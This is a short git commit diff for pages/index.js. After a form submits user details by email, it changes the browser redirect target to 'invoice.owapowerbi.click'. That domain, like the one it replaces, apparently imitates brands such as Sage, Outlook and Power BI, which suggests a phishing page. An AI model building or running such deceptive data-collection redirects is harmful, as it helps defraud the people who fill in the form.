62246af8afb050a5289a8378082aa0486e7a5c1b
husknet <127146284+husknet@users.noreply.github.com>
2024-10-14 09:24:40 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://open.sagemarketing-dashboard.click';
+        window.location.href = 'https://invoice.owapowerbi.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
